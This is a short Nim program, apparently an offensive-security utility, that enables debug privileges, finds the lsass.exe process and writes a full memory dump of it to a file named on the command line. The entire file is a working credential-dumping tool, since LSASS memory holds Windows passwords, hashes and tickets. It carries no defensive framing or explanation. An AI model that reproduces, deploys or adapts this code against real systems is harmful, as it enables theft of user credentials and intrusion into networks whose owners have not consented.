import winim, cligen

proc setPrivileges() =
    var token: HANDLE
    var privileges: TOKEN_PRIVILEGES
    var luid: LUID
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)
    privileges.PrivilegeCount = 1
    privileges.Privileges[0].Luid = luid
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    OpenProcessToken(GetCurrentProcess() , TOKEN_ADJUST_PRIVILEGES , &token)
    if (AdjustTokenPrivileges(token, FALSE , &privileges , sizeof(TOKEN_PRIVILEGES).DWORD , NULL , NULL)):
        echo("[+] Success Setting Token Privileges.")

proc getStringFromWideCharArray(wca : array[0..259,WCHAR]): string =
    var final : string = ""
    for byte in wca:
        add(final , chr(byte))
    return final

proc findLSASS(): DWORD =
    var pe32: PROCESSENTRY32
    pe32.dwSize = sizeof(PROCESSENTRY32).DWORD
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS , 0)
    Process32First(snapshot , &pe32)
    while Process32Next(snapshot , &pe32):
        let pid = pe32.th32ProcessID
        let name = getStringFromWideCharArray(pe32.szExeFile).LPCSTR
        #echo(name)
        if lstrcmpA(name, "lsass.exe") == 0:
            CloseHandle(snapshot)
            return pid

proc dumpLSASS(output : string): DWORD =
    setPrivileges()
    let pid = findLSASS()
    let hProc = OpenProcess(PROCESS_VM_READ or PROCESS_QUERY_INFORMATION, 0, pid)
    if hProc == INVALID_HANDLE_VALUE or hProc == 0:
        echo("[-] LSASS Handle is Invalid")
        quit(1)
    let file: HANDLE = CreateFileA(output.LPCSTR, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
    let res = MiniDumpWriteDump(hProc, pid, file, cast[MINIDUMP_TYPE](0x00000002), NULL, NULL, NULL)
    if res == 1:
        echo("[+] Wrote LSASS Dump Successfully.")
    else:
        echo("[-] Dump Not Written Successfully.")

when isMainModule:
    dispatch dumpLSASS